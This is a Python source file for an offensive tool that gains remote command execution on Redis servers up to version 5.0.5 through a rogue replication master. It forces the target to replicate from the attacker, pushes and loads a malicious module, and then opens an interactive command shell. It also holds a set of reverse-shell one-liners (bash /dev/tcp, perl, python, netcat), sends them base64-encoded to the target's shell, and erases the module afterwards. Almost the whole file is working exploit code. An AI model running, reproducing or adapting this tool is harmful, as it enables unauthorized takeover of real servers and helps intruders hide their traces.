#!/usr/bin/env python3
import socket
import sys
from time import sleep
import os
import platform
import argparse
import base64
import random
import string
import threading
import ipaddress

CLRF = "\r\n"
SERVER_EXP_MOD_FILE = "exp.so"

BANNER = """______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig
Enhanced version - Redis(<=5.0.5) RCE Tool
"""

# Pre-made reverse shell payloads for different languages
SHELL_PAYLOADS = {
    "bash": "bash -i >& /dev/tcp/{0}/{1} 0>&1",
    "bash_alt": "bash -c 'exec bash -i &>/dev/tcp/{0}/{1} <&1'",
    "perl": "perl -e 'use Socket;$i=\"{0}\";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
    "nc_mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f",
    "nc_e": "nc {0} {1} -e /bin/sh",
}

def encode_cmd_arr(arr):
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CLRF + "$" + str(len(arg))
        cmd += CLRF + arg
    cmd += "\r\n"
    return cmd

def encode_cmd(raw_cmd):
    return encode_cmd_arr(raw_cmd.split(" "))

def decode_cmd(cmd):
    if cmd.startswith("*"):
        raw_arr = cmd.strip().split("\r\n")
        return raw_arr[2::2]
    if cmd.startswith("$"):
        return cmd.split("\r\n", 2)[1]
    return cmd.strip().split(" ")

def info(msg):
    print(f"\033[1;32;40m[INFO]\033[0m {msg}")

def error(msg):
    print(f"\033[1;31;40m[ERROR]\033[0m {msg}")

def warn(msg):
    print(f"\033[1;33;40m[WARN]\033[0m {msg}")

def success(msg):
    print(f"\033[1;36;40m[SUCCESS]\033[0m {msg}")

def din(sock, cnt=4096):
    global verbose
    try:
        msg = sock.recv(cnt)
        if verbose:
            if len(msg) < 1000:
                print(f"\033[1;34;40m[->]\033[0m {msg}")
            else:
                print(f"\033[1;34;40m[->]\033[0m {msg[:80]}......{msg[-80:]}")
        return msg.decode('gb18030', errors='replace')
    except Exception as e:
        error(f"Connection error: {e}")
        return ""

def dout(sock, msg):
    global verbose
    try:
        if type(msg) != bytes:
            msg = msg.encode()
        sock.send(msg)
        if verbose:
            if len(msg) < 1000:
                print(f"\033[1;33;40m[<-]\033[0m {msg}")
            else:
                print(f"\033[1;33;40m[<-]\033[0m {msg[:80]}......{msg[-80:]}")
    except Exception as e:
        error(f"Connection error: {e}")

def decode_shell_result(s):
    return "\n".join(s.split("\r\n")[1:-1])

class Remote:
    def __init__(self, rhost, rport, timeout=10):
        self._host = rhost
        self._port = rport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.settimeout(timeout)
        try:
            self._sock.connect((self._host, self._port))
            info(f"Connected to {self._host}:{self._port}")
        except Exception as e:
            error(f"Connection to {self._host}:{self._port} failed: {e}")
            sys.exit(1)

    def send(self, msg):
        dout(self._sock, msg)

    def recv(self, cnt=65535):
        return din(self._sock, cnt)

    def do(self, cmd):
        self.send(encode_cmd(cmd))
        buf = self.recv()
        return buf

    def shell_cmd(self, cmd):
        self.send(encode_cmd_arr(['system.exec', f"{cmd}"]))
        buf = self.recv()
        return buf
        
    def close(self):
        self._sock.close()

class RogueServer:
    def __init__(self, lhost, lport):
        self._host = lhost
        self._port = lport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self._sock.bind(('0.0.0.0', self._port))
            self._sock.listen(10)
            info(f"Rogue server started at 0.0.0.0:{self._port}")
        except Exception as e:
            error(f"Failed to start rogue server: {e}")
            sys.exit(1)

    def close(self):
        try:
            self._sock.close()
            info("Rogue server stopped")
        except:
            pass

    def handle(self, data):
        cmd_arr = decode_cmd(data)
        resp = ""
        phase = 0
        if cmd_arr[0].startswith("PING"):
            resp = "+PONG" + CLRF
            phase = 1
        elif cmd_arr[0].startswith("REPLCONF"):
            resp = "+OK" + CLRF
            phase = 2
        elif cmd_arr[0].startswith("PSYNC") or cmd_arr[0].startswith("SYNC"):
            resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
            resp += "$" + str(len(payload)) + CLRF
            resp = resp.encode()
            resp += payload + CLRF.encode()
            phase = 3
        return resp, phase

    def exp(self):
        try:
            info("Waiting for Redis connection...")
            cli, addr = self._sock.accept()
            info(f"Connection from {addr[0]}:{addr[1]}")
            while True:
                data = din(cli, 1024)
                if not data:
                    break
                resp, phase = self.handle(data)
                dout(cli, resp)
                if phase == 3:
                    success("Payload sent successfully!")
                    break
        except Exception as e:
            error(f"Rogue server error: {e}")

class ReverseShellHandler:
    def __init__(self, lport):
        self._port = lport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._running = False
        self._client = None
        self._client_address = None
        
    def start(self):
        try:
            self._sock.bind(('0.0.0.0', self._port))
            self._sock.listen(1)
            self._running = True
            info(f"Reverse shell handler started on port {self._port}")
            info("Waiting for connection...")
            self._sock.settimeout(60)  # 60 second timeout for reverse shell
            self._client, self._client_address = self._sock.accept()
            success(f"Reverse shell connection received from {self._client_address[0]}:{self._client_address[1]}")
            self._client.settimeout(None)  # Remove timeout for interactive session
            self._sock.settimeout(None)
            return True
        except socket.timeout:
            error("Timeout waiting for reverse shell connection")
            self.stop()
            return False
        except Exception as e:
            error(f"Error starting reverse shell handler: {e}")
            self.stop()
            return False
            
    def stop(self):
        self._running = False
        if self._client:
            try:
                self._client.close()
            except:
                pass
        try:
            self._sock.close()
        except:
            pass
        info("Reverse shell handler stopped")
            
    def interact(self):
        if not self._client:
            error("No reverse shell connection available")
            return
            
        info("Interactive reverse shell session started")
        info("Type 'exit' to close the session")
        
        # Set terminal to raw mode
        try:
            import termios, tty
            old_settings = termios.tcgetattr(sys.stdin)
            tty.setraw(sys.stdin.fileno())
            raw_mode = True
        except:
            raw_mode = False
            
        def read_from_socket():
            while self._running:
                try:
                    data = self._client.recv(4096)
                    if not data:
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                except:
                    break
            self._running = False
            
        t = threading.Thread(target=read_from_socket)
        t.daemon = True
        t.start()
        
        try:
            while self._running:
                if raw_mode:
                    # In raw mode, read one byte at a time
                    char = sys.stdin.read(1)
                    if char == '\x04':  # Ctrl+D
                        break
                    self._client.send(char.encode())
                else:
                    # In normal mode, read a line at a time
                    cmd = input()
                    if cmd.lower() == "exit":
                        break
                    self._client.send((cmd + "\n").encode())
        except KeyboardInterrupt:
            info("\nSession terminated by user")
        except Exception as e:
            error(f"Shell error: {e}")
        finally:
            if raw_mode:
                # Restore terminal settings
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
            self.stop()

def interact(remote):
    info("Interactive shell mode started. Type 'exit' to quit.")
    try:
        while True:
            cmd = input("\033[1;32;40m[CMD]>\033[0m ").strip()
            if cmd.lower() == "exit":
                return
            elif cmd.lower() == "clear":
                os.system('cls' if platform.system() == 'Windows' else 'clear')
                continue
            elif cmd.lower() == "help":
                print("Available commands:")
                print("  - Any shell command to execute on the target")
                print("  - 'exit': Exit interactive mode")
                print("  - 'clear': Clear the screen")
                continue
                
            if not cmd:
                continue
                
            r = remote.shell_cmd(cmd)
            result = decode_shell_result(r)
            if result:
                for l in result.split("\n"):
                    print("\033[1;34;40m[OUTPUT]\033[0m " + l)
            else:
                print("\033[1;34;40m[OUTPUT]\033[0m Command executed (no output)")
    except KeyboardInterrupt:
        print("\nInteractive session terminated")
    except Exception as e:
        error(f"Error in interact mode: {e}")

def start_reverse_handler(port):
    handler = ReverseShellHandler(port)
    if handler.start():
        handler.interact()

def reverse(remote):
    info("Setting up reverse shell...")
    
    # Detect public IP
    try:
        import urllib.request
        external_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
        suggested_ip = external_ip
    except:
        suggested_ip = "IP_ADDRESS"

    addr = input(f"Reverse shell receiver IP [{suggested_ip}]: ").strip()
    if not addr:
        addr = suggested_ip

    # Try to validate IP address
    try:
        ipaddress.ip_address(addr)
    except ValueError:
        warn(f"'{addr}' doesn't appear to be a valid IP address. Make sure it's reachable from the target.")
        
    port = input("Reverse shell receiver port [4444]: ").strip()
    if not port:
        port = "4444"
    try:
        port = int(port)
    except:
        error(f"Invalid port: {port}")
        return

    # Start reverse shell handler in a separate thread
    threading.Thread(target=start_reverse_handler, args=(port,), daemon=True).start()
    
    # Ask user for preferred shell type
    print("\nAvailable payload types:")
    print("  1. Bash (default)")
    print("  2. Perl")
    print("  3. Python")
    print("  4. Netcat (mkfifo)")
    print("  5. Netcat (-e)")
    
    choice = input("\nSelect payload type [1]: ").strip()
    if not choice:
        choice = "1"
        
    if choice == "1":
        payload_key = "bash"
    elif choice == "2":
        payload_key = "perl"
    elif choice == "3":
        payload_key = "python"
    elif choice == "4":
        payload_key = "nc_mkfifo"
    elif choice == "5":
        payload_key = "nc_e"
    else:
        payload_key = "bash"
        
    payload = SHELL_PAYLOADS[payload_key].format(addr, port)
    
    # Ask if base64 encoding should be used
    use_b64 = input("Use base64 encoding to avoid special character issues? (Y/n): ").strip().lower()
    if use_b64 != "n":
        encoded_payload = base64.b64encode(payload.encode()).decode()
        cmd = f"echo {encoded_payload} | base64 -d | sh"
    else:
        cmd = payload
        
    info(f"Sending reverse shell payload...")
    remote.shell_cmd(cmd)
    success(f"Reverse shell payload sent to {addr}:{port}")
    info("If the connection doesn't establish within 60 seconds, try a different method")

def cleanup(remote):
    try:
        info("Cleaning up...")
        remote.do("MODULE UNLOAD system")
        info("Module unloaded")
    except Exception as e:
        warn(f"Cleanup error (this is not critical): {e}")

def check_requirements():
    """Check if required tools and files are available"""
    if not os.path.exists(exp_mod):
        error(f"Module file '{exp_mod}' not found!")
        return False
    return True

def validate_ip(ip):
    """Validate IP address format"""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def get_random_string(length=8):
    """Generate a random string of fixed length"""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def runserver(rhost, rport, lhost, lport, passwd):
    if not check_requirements():
        return

    try:
        # Connect to target Redis server
        remote = Remote(rhost, rport)
        
        # Auth if password is provided
        if passwd:
            info("Authenticating...")
            auth_result = remote.do(f"AUTH {passwd}")
            if "OK" not in auth_result:
                error(f"Authentication failed: {auth_result}")
                return
            success("Authentication successful")
            
        # Set as slave to our rogue server
        info(f"Setting target as slave to {lhost}:{lport}...")
        remote.do(f"SLAVEOF {lhost} {lport}")
        
        # Set dbfilename to our module filename
        info(f"Setting dbfilename to {SERVER_EXP_MOD_FILE}...")
        remote.do(f"CONFIG SET dbfilename {SERVER_EXP_MOD_FILE}")
        sleep(2)
        
        # Start rogue server and exploit
        info("Starting rogue Redis server...")
        rogue = RogueServer(lhost, lport)
        rogue.exp()
        sleep(2)
        
        # Load module
        info("Loading malicious module...")
        module_result = remote.do(f"MODULE LOAD ./{SERVER_EXP_MOD_FILE}")
        if "ERR" in module_result:
            error(f"Failed to load module: {module_result}")
            # Clean up and exit
            remote.do("SLAVEOF NO ONE")
            remote.do("CONFIG SET dbfilename dump.rdb")
            rogue.close()
            return
            
        success("Module loaded successfully!")
        
        # Cleanup temporary files and reset slave
        info("Cleaning up temporary files...")
        remote.do("SLAVEOF NO ONE")
        remote.do("CONFIG SET dbfilename dump.rdb")
        remote.shell_cmd(f"rm -f ./{SERVER_EXP_MOD_FILE}")
        rogue.close()

        # Operations menu
        print("\n" + "=" * 60)
        print("COMMAND EXECUTION READY")
        print("=" * 60)
        print("Available options:")
        print("  1. Interactive shell")
        print("  2. Reverse shell")
        print("  3. Exit")
        
        choice = input("\nSelect an option [1]: ").strip()
        if not choice:
            choice = "1"
            
        if choice == "1":
            interact(remote)
        elif choice == "2":
            reverse(remote)
        else:
            info("Exiting...")
            
        # Final cleanup
        cleanup(remote)
        remote.close()
        
    except KeyboardInterrupt:
        print("\nOperation interrupted by user")
    except Exception as e:
        error(f"Exploitation error: {repr(e)}")

def check_connectivity(host, port):
    """Check if target is reachable and port is open"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

if __name__ == '__main__':
    # Title and banner
    print("\033c", end="")  # Clear screen
    print(BANNER)
    
    # Parse arguments
    parser = argparse.ArgumentParser(description="Redis (<=5.0.5) Remote Command Execution Tool")
    parser.add_argument("--rhost", dest="rh", type=str,
            help="Target Redis host", metavar="REMOTE_HOST")
    parser.add_argument("--rport", dest="rp", type=int,
            help="Target Redis port (default: 6379)", default=6379,
            metavar="REMOTE_PORT")
    parser.add_argument("--lhost", dest="lh", type=str,
            help="Local IP for rogue server (must be reachable from target)", metavar="LOCAL_HOST")
    parser.add_argument("--lport", dest="lp", type=int,
            help="Local port for rogue server (default: 21000)", default=21000,
            metavar="LOCAL_PORT")
    parser.add_argument("--exp", dest="exp", type=str,
            help=f"Redis Module to load (default: {SERVER_EXP_MOD_FILE})", default=SERVER_EXP_MOD_FILE,
            metavar="EXP_FILE")
    parser.add_argument("-v", "--verbose", action="store_true", default=False,
            help="Show full data stream")
    parser.add_argument("--passwd", dest="rpasswd", type=str,
            help="Target Redis password")
    parser.add_argument("--timeout", dest="timeout", type=int, default=10,
            help="Connection timeout in seconds (default: 10)")
    parser.add_argument("--no-check", dest="nocheck", action="store_true", default=False,
            help="Skip connectivity check")

    args = parser.parse_args()
    
    # Set global variables
    global verbose, payload, exp_mod
    verbose = args.verbose
    exp_mod = args.exp
    
    # Interactive mode if arguments are missing
    if not args.rh:
        args.rh = input("Target Redis host: ").strip()
    
    if not args.rh:
        parser.error("Target host is required")
        
    if not validate_ip(args.rh) and args.rh != "localhost":
        warn(f"'{args.rh}' doesn't appear to be a valid IP address")
        
    # Ask for password if not provided
    if args.rpasswd is None:
        passwd_prompt = input("Does the Redis server require authentication? (y/N): ").strip().lower()
        if passwd_prompt == 'y':
            args.rpasswd = input("Enter Redis password: ").strip()
        else:
            args.rpasswd = None
    
    # Check for local IP if not provided
    if not args.lh:
        # Try to detect local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            args.lh = input(f"Local IP for rogue server [{local_ip}]: ").strip()
            if not args.lh:
                args.lh = local_ip
        except:
            args.lh = input("Local IP for rogue server: ").strip()
            
    # Validate local IP
    if not validate_ip(args.lh) and args.lh != "localhost":
        error(f"Invalid local IP: {args.lh}")
        sys.exit(1)
    
    # Load exploit module
    try:
        with open(exp_mod, "rb") as f:
            payload = f.read()
        info(f"Loaded {exp_mod} ({len(payload)} bytes)")
    except Exception as e:
        error(f"Failed to load module file: {e}")
        sys.exit(1)
        
    # Connectivity check
    if not args.nocheck:
        info(f"Checking connectivity to {args.rh}:{args.rp}...")
        if not check_connectivity(args.rh, args.rp):
            error(f"Cannot connect to {args.rh}:{args.rp}")
            proceed = input("Continue anyway? (y/N): ").strip().lower()
            if proceed != 'y':
                sys.exit(1)
    
    # Display exploit information
    print("\n" + "=" * 60)
    info(f"TARGET: {args.rh}:{args.rp}")
    info(f"ROGUE SERVER: {args.lh}:{args.lp}")
    if args.rpasswd:
        info(f"AUTHENTICATION: Enabled")
    else:
        info(f"AUTHENTICATION: Disabled")
    print("=" * 60 + "\n")
    
    # Start exploitation
    try:
        runserver(args.rh, args.rp, args.lh, args.lp, args.rpasswd)
    except KeyboardInterrupt:
        print("\nOperation cancelled by user")
    except Exception as e:
        error(f"Error: {repr(e)}")
    
    print("\nTool execution completed")